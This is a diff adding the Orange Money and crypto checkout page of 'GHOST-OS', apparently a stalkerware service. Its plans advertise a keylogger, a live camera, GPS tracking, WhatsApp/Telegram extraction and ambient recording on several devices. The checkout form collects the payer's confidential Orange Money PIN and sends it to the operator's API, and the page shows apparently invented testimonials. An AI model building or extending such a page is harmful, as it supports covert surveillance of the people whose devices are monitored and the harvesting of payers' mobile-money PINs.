@@ -1,0 +1,403 @@
+<!-- panel/payment/orange_money_advanced.html -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orange Money - Paiement Sécurisé</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .pulse-animation {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        .phone-input {
+            direction: ltr;
+        }
+        .phone-input:focus {
+            outline: none;
+            ring: 2px solid #ff6b00;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full">
+        <!-- En-tête -->
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold text-orange-500">💰 Paiement</h1>
+            <p class="text-gray-400 mt-2">Activez votre abonnement GHOST-OS</p>
+        </div>
+        
+        <!-- Carte de paiement -->
+        <div class="bg-gray-800 rounded-2xl shadow-2xl overflow-hidden border border-gray-700">
+            <!-- Bannière Orange Money -->
+            <div class="bg-gradient-to-r from-orange-600 to-orange-500 p-6">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <h2 class="text-2xl font-bold text-white">Orange Money</h2>
+                        <p class="text-orange-100 text-sm">Paiement mobile sécurisé</p>
+                    </div>
+                    <div class="bg-white bg-opacity-20 p-3 rounded-full">
+                        <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Corps -->
+            <div class="p-6">
+                <!-- Sélection du plan -->
+                <div class="mb-6">
+                    <label class="block text-sm font-medium text-gray-400 mb-3">Choisissez votre formule</label>
+                    <div class="grid grid-cols-1 gap-3">
+                        <div class="plan-card bg-gray-700 p-4 rounded-lg cursor-pointer border-2 border-transparent hover:border-orange-500 transition" data-plan="premium" data-price="29.99">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <h3 class="text-lg font-bold text-white">Premium</h3>
+                                    <p class="text-sm text-gray-400">30 jours d'accès illimité</p>
+                                    <ul class="text-xs text-gray-400 mt-2 space-y-1">
+                                        <li>✓ 3 appareils maximum</li>
+                                        <li>✓ Capture écran HD</li>
+                                        <li>✓ Caméra en direct</li>
+                                        <li>✓ Keylogger complet</li>
+                                        <li>✓ Localisation GPS</li>
+                                    </ul>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-2xl font-bold text-orange-500">29.99</span>
+                                    <span class="text-sm text-gray-400">USDT</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="plan-card bg-gray-700 p-4 rounded-lg cursor-pointer border-2 border-transparent hover:border-orange-500 transition" data-plan="enterprise" data-price="99.99">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <div class="flex items-center">
+                                        <h3 class="text-lg font-bold text-white">Enterprise</h3>
+                                        <span class="ml-2 bg-orange-500 text-xs px-2 py-1 rounded-full">POPULAIRE</span>
+                                    </div>
+                                    <p class="text-sm text-gray-400">30 jours + fonctionnalités avancées</p>
+                                    <ul class="text-xs text-gray-400 mt-2 space-y-1">
+                                        <li>✓ 10 appareils maximum</li>
+                                        <li>✓ Toutes les fonctionnalités</li>
+                                        <li>✓ Extraction WhatsApp/Telegram</li>
+                                        <li>✓ Enregistrement ambiant</li>
+                                        <li>✓ Support prioritaire</li>
+                                    </ul>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-2xl font-bold text-orange-500">99.99</span>
+                                    <span class="text-sm text-gray-400">USDT</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Formulaire Orange Money -->
+                <div id="orange-form" class="space-y-4 mb-6">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-400 mb-2">📱 Numéro Orange Money</label>
+                        <div class="flex">
+                            <span class="inline-flex items-center px-3 bg-gray-700 border border-r-0 border-gray-600 rounded-l-lg text-gray-400">
+                                +226
+                            </span>
+                            <input type="tel" id="phone" placeholder="70 00 00 00" 
+                                   class="flex-1 bg-gray-700 border border-gray-600 rounded-r-lg px-4 py-3 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent phone-input">
+                        </div>
+                        <p class="text-xs text-gray-500 mt-1">Numéro valide au Burkina Faso</p>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-medium text-gray-400 mb-2">🔐 Code confidentiel</label>
+                        <input type="password" id="pin" placeholder="****" maxlength="4" 
+                               class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-medium text-gray-400 mb-2">📧 Email (pour la facture)</label>
+                        <input type="email" id="email" placeholder="votre@email.com" 
+                               class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent">
+                    </div>
+                    
+                    <div class="flex items-center">
+                        <input type="checkbox" id="terms" class="rounded bg-gray-700 border-gray-600 text-orange-500">
+                        <label for="terms" class="ml-2 text-sm text-gray-400">
+                            J'accepte les <a href="#" class="text-orange-500">conditions d'utilisation</a>
+                        </label>
+                    </div>
+                </div>
+                
+                <!-- Options crypto -->
+                <div class="mb-6">
+                    <div class="relative">
+                        <div class="absolute inset-0 flex items-center">
+                            <div class="w-full border-t border-gray-700"></div>
+                        </div>
+                        <div class="relative flex justify-center text-sm">
+                            <span class="px-2 bg-gray-800 text-gray-400">Ou payer en crypto</span>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-3 gap-2 mt-4">
+                        <button onclick="showCrypto('USDT_TRC20')" class="p-3 bg-gray-700 rounded-lg text-center hover:bg-gray-600 transition">
+                            <span class="block font-bold text-white">USDT</span>
+                            <span class="text-xs text-gray-400">TRC20</span>
+                        </button>
+                        <button onclick="showCrypto('BTC')" class="p-3 bg-gray-700 rounded-lg text-center hover:bg-gray-600 transition">
+                            <span class="block font-bold text-white">BTC</span>
+                            <span class="text-xs text-gray-400">Bitcoin</span>
+                        </button>
+                        <button onclick="showCrypto('ETH')" class="p-3 bg-gray-700 rounded-lg text-center hover:bg-gray-600 transition">
+                            <span class="block font-bold text-white">ETH</span>
+                            <span class="text-xs text-gray-400">Ethereum</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Zone crypto (cachée par défaut) -->
+                <div id="crypto-section" class="hidden mb-6">
+                    <div class="bg-gray-700 p-4 rounded-lg text-center">
+                        <p class="text-sm text-gray-300 mb-3">Scannez le QR code pour payer</p>
+                        <div class="bg-white p-2 rounded-lg inline-block mb-3">
+                            <img id="qr-code" src="" alt="QR Code" class="w-48 h-48">
+                        </div>
+                        <div class="bg-gray-600 p-3 rounded-lg mb-3">
+                            <p class="text-xs text-gray-400 mb-1">Adresse de paiement</p>
+                            <p id="crypto-address" class="text-sm font-mono break-all text-white"></p>
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="copyAddress()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-2 px-3 rounded-lg text-sm">
+                                📋 Copier
+                            </button>
+                            <button onclick="checkCryptoPayment()" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-2 px-3 rounded-lg text-sm">
+                                ✅ Vérifier
+                            </button>
+                        </div>
+                        <p class="text-xs text-gray-400 mt-3">
+                            <span class="inline-block w-2 h-2 bg-yellow-500 rounded-full pulse-animation mr-1"></span>
+                            En attente du paiement...
+                        </p>
+                    </div>
+                </div>
+                
+                <!-- Bouton de paiement -->
+                <button onclick="processPayment()" id="pay-button" class="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-4 rounded-lg text-lg transition transform hover:scale-105">
+                    Payer avec Orange Money
+                </button>
+                
+                <!-- Sécurité -->
+                <div class="mt-4 flex items-center justify-center text-xs text-gray-500">
+                    <svg class="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
+                    </svg>
+                    Paiement 100% sécurisé
+                </div>
+            </div>
+        </div>
+        
+        <!-- Témoignages -->
+        <div class="mt-8 grid grid-cols-2 gap-4">
+            <div class="bg-gray-800 p-3 rounded-lg">
+                <div class="flex items-center mb-2">
+                    <div class="text-yellow-500">★★★★★</div>
+                </div>
+                <p class="text-sm text-gray-300">"Paiement rapide et sécurisé"</p>
+                <p class="text-xs text-gray-500 mt-1">- Ibrahim, Ouagadougou</p>
+            </div>
+            <div class="bg-gray-800 p-3 rounded-lg">
+                <div class="flex items-center mb-2">
+                    <div class="text-yellow-500">★★★★★</div>
+                </div>
+                <p class="text-sm text-gray-300">"Service client réactif"</p>
+                <p class="text-xs text-gray-500 mt-1">- Mariam, Bobo-Dioulasso</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let selectedPlan = 'premium';
+        let selectedPrice = 29.99;
+        let currentTxRef = null;
+        
+        // Sélection du plan
+        document.querySelectorAll('.plan-card').forEach(card => {
+            card.addEventListener('click', function() {
+                document.querySelectorAll('.plan-card').forEach(c => {
+                    c.classList.remove('border-orange-500');
+                });
+                this.classList.add('border-orange-500');
+                
+                selectedPlan = this.dataset.plan;
+                selectedPrice = this.dataset.price;
+            });
+        });
+        
+        // Sélectionner Premium par défaut
+        document.querySelector('[data-plan="premium"]').classList.add('border-orange-500');
+        
+        function processPayment() {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            const email = document.getElementById('email').value;
+            const terms = document.getElementById('terms').checked;
+            
+            if (!phone || !pin || !email || !terms) {
+                alert('Veuillez remplir tous les champs');
+                return;
+            }
+            
+            // Simuler un paiement Orange Money
+            showLoading();
+            
+            // Appel API pour initier le paiement
+            fetch('/api/v1/orange_money.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Key': localStorage.getItem('apiKey')
+                },
+                body: JSON.stringify({
+                    action: 'initiate',
+                    phone: phone,
+                    pin: pin,
+                    email: email,
+                    plan: selectedPlan,
+                    amount: selectedPrice
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                hideLoading();
+                
+                if (data.success) {
+                    showSuccess('Paiement initié. Confirmez sur votre téléphone Orange Money');
+                    
+                    // Vérifier le statut
+                    checkPaymentStatus(data.transaction_id);
+                } else {
+                    showError(data.error || 'Erreur de paiement');
+                }
+            })
+            .catch(() => {
+                hideLoading();
+                showError('Erreur de connexion');
+            });
+        }
+        
+        function showCrypto(currency) {
+            document.getElementById('orange-form').classList.add('hidden');
+            document.getElementById('crypto-section').classList.remove('hidden');
+            document.getElementById('pay-button').classList.add('hidden');
+            
+            // Générer une adresse de paiement
+            fetch('/api/v1/crypto_payments.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Key': localStorage.getItem('apiKey')
+                },
+                body: JSON.stringify({
+                    action: 'generate_address',
+                    plan: selectedPlan,
+                    currency: currency
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('qr-code').src = data.payment.qr_code;
+                    document.getElementById('crypto-address').textContent = data.payment.address;
+                    currentTxRef = data.payment.tx_ref;
+                }
+            });
+        }
+        
+        function checkCryptoPayment() {
+            if (!currentTxRef) return;
+            
+            fetch('/api/v1/crypto_payments.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Key': localStorage.getItem('apiKey')
+                },
+                body: JSON.stringify({
+                    action: 'verify_payment',
+                    tx_ref: currentTxRef,
+                    tx_hash: prompt('Entrez le hash de la transaction:')
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    showSuccess('Paiement confirmé ! Redirection...');
+                    setTimeout(() => {
+                        window.location.href = '/panel/dashboard.html';
+                    }, 2000);
+                } else {
+                    showError('Paiement non trouvé');
+                }
+            });
+        }
+        
+        function copyAddress() {
+            const address = document.getElementById('crypto-address').textContent;
+            navigator.clipboard.writeText(address);
+            showNotification('Adresse copiée !', 'success');
+        }
+        
+        function checkPaymentStatus(transactionId) {
+            const interval = setInterval(() => {
+                fetch('/api/v1/orange_money.php?action=status&id=' + transactionId)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'completed') {
+                        clearInterval(interval);
+                        showSuccess('Paiement confirmé ! Activation en cours...');
+                        setTimeout(() => {
+                            window.location.href = '/panel/dashboard.html';
+                        }, 2000);
+                    }
+                });
+            }, 3000);
+        }
+        
+        function showLoading() {
+            // Créer un overlay de chargement
+            const overlay = document.createElement('div');
+            overlay.id = 'loading-overlay';
+            overlay.className = 'fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50';
+            overlay.innerHTML = `
+                <div class="bg-gray-800 p-8 rounded-lg text-center">
+                    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-orange-500 mx-auto mb-4"></div>
+                    <p class="text-white">Traitement du paiement...</p>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+        }
+        
+        function hideLoading() {
+            const overlay = document.getElementById('loading-overlay');
+            if (overlay) overlay.remove();
+        }
+        
+        function showSuccess(message) {
+            alert(message);
+        }
+        
+        function showError(message) {
+            alert('Erreur: ' + message);
+        }
+        
+        function showNotification(message, type) {
+            // Implémentation de notification
+        }
+    </script>
+</body>
+</html>
